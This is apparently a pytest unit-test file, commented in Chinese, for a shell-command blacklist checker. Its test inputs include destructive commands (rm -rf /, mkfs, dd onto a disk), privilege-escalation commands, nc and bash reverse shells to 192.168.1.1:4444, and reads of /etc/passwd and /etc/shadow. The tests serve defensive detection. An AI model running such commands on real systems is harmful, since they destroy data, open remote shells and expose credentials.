# Shell命令黑名单单元测试
# 编程人：小沈
# 创建时间：2026-02-17

"""
Shell命令黑名单安全检查服务单元测试
测试危险命令检测功能
"""

import pytest
from app.services.shell_security import (
    CommandSafetyChecker,
    check_command_safety,
    is_command_safe,
    get_command_risk_level,
    DANGEROUS_COMMANDS
)


class TestCommandSafetyChecker:
    """命令安全检查器测试"""
    
    @pytest.fixture
    def checker(self):
        """创建检查器实例"""
        return CommandSafetyChecker()
    
    # ========== 安全命令测试 ==========
    
    def test_safe_command_ls(self, checker):
        """测试安全命令: ls"""
        is_safe, reason = checker.check("ls -la")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cd(self, checker):
        """测试安全命令: cd"""
        is_safe, reason = checker.check("cd /home/user")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_mkdir(self, checker):
        """测试安全命令: mkdir"""
        is_safe, reason = checker.check("mkdir new_folder")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cat_file(self, checker):
        """测试安全命令: cat普通文件"""
        is_safe, reason = checker.check("cat /home/user/document.txt")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cp(self, checker):
        """测试安全命令: cp复制"""
        is_safe, reason = checker.check("cp file1.txt file2.txt")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_empty(self, checker):
        """测试空命令"""
        is_safe, reason = checker.check("")
        assert is_safe is True
        assert reason == ""
    
    # ========== 危险命令测试 - 系统破坏类 ==========
    
    def test_dangerous_rm_rf_root(self, checker):
        """测试危险命令: rm -rf /"""
        is_safe, reason = checker.check("rm -rf /")
        assert is_safe is False
        assert "rm -rf" in reason.lower() or "危险" in reason
    
    def test_dangerous_rm_rf_star(self, checker):
        """测试危险命令: rm -rf /*"""
        is_safe, reason = checker.check("rm -rf /*")
        assert is_safe is False
    
    def test_dangerous_format(self, checker):
        """测试危险命令: format"""
        is_safe, reason = checker.check("format c:")
        assert is_safe is False
        assert "format" in reason.lower() or "危险" in reason
    
    def test_dangerous_mkfs(self, checker):
        """测试危险命令: mkfs"""
        is_safe, reason = checker.check("mkfs.ext4 /dev/sda")
        assert is_safe is False
    
    def test_dangerous_dd(self, checker):
        """测试危险命令: dd写入设备"""
        is_safe, reason = checker.check("dd if=/dev/zero of=/dev/sda")
        assert is_safe is False
    
    # ========== 危险命令测试 - 权限提升类 ==========
    
    def test_dangerous_sudo(self, checker):
        """测试危险命令: sudo"""
        is_safe, reason = checker.check("sudo rm -rf /")
        assert is_safe is False
    
    def test_dangerous_su(self, checker):
        """测试危险命令: su"""
        is_safe, reason = checker.check("su - root")
        assert is_safe is False
    
    def test_dangerous_chmod_777_root(self, checker):
        """测试危险命令: chmod 777 /"""
        is_safe, reason = checker.check("chmod 777 /")
        assert is_safe is False
    
    # ========== 危险命令测试 - 网络攻击类 ==========
    
    def test_dangerous_nc_reverse_shell(self, checker):
        """测试危险命令: nc反向shell"""
        is_safe, reason = checker.check("nc -e /bin/bash 192.168.1.1 4444")
        assert is_safe is False
    
    def test_dangerous_bash_reverse_shell(self, checker):
        """测试危险命令: bash反向shell"""
        is_safe, reason = checker.check("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1")
        assert is_safe is False
    
    # ========== 危险命令测试 - 数据泄露类 ==========
    
    def test_dangerous_cat_passwd(self, checker):
        """测试危险命令: 读取passwd"""
        is_safe, reason = checker.check("cat /etc/passwd")
        assert is_safe is False
    
    def test_dangerous_cat_shadow(self, checker):
        """测试危险命令: 读取shadow"""
        is_safe, reason = checker.check("cat /etc/shadow")
        assert is_safe is False
    
    # ========== 风险等级测试 ==========
    
    def test_risk_level_safe(self, checker):
        """测试安全命令风险等级"""
        level = checker.get_risk_level("ls -la")
        assert level == "safe"
    
    def test_risk_level_critical(self, checker):
        """测试高危命令风险等级"""
        level = checker.get_risk_level("rm -rf /")
        assert level == "critical"
    
    def test_risk_level_high(self, checker):
        """测试高风险命令风险等级"""
        level = checker.get_risk_level("sudo rm -rf /")
        assert level in ["high", "critical"]
    
    def test_risk_level_medium(self, checker):
        """测试中等风险命令风险等级"""
        level = checker.get_risk_level("cat /etc/passwd")
        assert level in ["medium", "high", "critical"]


class TestQuickFunctions:
    """快速函数测试"""
    
    def test_check_command_safety(self):
        """测试快速检查函数"""
        is_safe, reason = check_command_safety("ls")
        assert is_safe is True
    
    def test_is_command_safe(self):
        """测试快速安全判断"""
        assert is_command_safe("ls") is True
        assert is_command_safe("rm -rf /") is False
    
    def test_get_command_risk_level(self):
        """测试风险等级获取"""
        assert get_command_risk_level("ls") == "safe"
        assert get_command_risk_level("rm -rf /") == "critical"


class TestDangerousCommandsList:
    """危险命令列表测试"""
    
    def test_dangerous_commands_not_empty(self):
        """验证危险命令列表不为空"""
        assert len(DANGEROUS_COMMANDS) > 0
    
    def test_dangerous_commands_contains_rm_rf(self):
        """验证包含rm -rf"""
        assert any("rm -rf" in cmd for cmd in DANGEROUS_COMMANDS)
    
    def test_dangerous_commands_contains_format(self):
        """验证包含format"""
        assert any("format" in cmd for cmd in DANGEROUS_COMMANDS)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
